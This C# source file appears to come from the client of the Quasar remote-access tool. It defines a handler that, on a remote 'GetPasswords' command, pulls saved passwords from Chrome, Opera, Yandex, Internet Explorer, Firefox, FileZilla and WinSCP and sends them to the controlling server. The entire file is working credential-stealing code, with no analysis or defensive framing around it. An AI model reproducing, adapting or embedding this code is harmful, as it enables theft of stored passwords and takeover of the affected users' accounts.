using Quasar.Client.Recovery.Browsers;
using Quasar.Client.Recovery.FtpClients;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using System.Collections.Generic;

namespace Quasar.Client.Messages
{
    public class PasswordRecoveryHandler : MessageProcessorBase<object>
    {
        public PasswordRecoveryHandler() : base(false)
        {
        }

        public override bool CanExecute(IMessage message) => message is GetPasswords;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPasswords msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetPasswords message)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            recovered.AddRange(Chrome.GetSavedPasswords());
            recovered.AddRange(Opera.GetSavedPasswords());
            recovered.AddRange(Yandex.GetSavedPasswords());
            recovered.AddRange(InternetExplorer.GetSavedPasswords());
            recovered.AddRange(Firefox.GetSavedPasswords());
            recovered.AddRange(FileZilla.GetSavedPasswords());
            recovered.AddRange(WinSCP.GetSavedPasswords());

            client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
        }

        protected override void Dispose(bool disposing)
        {
            
        }
    }
}
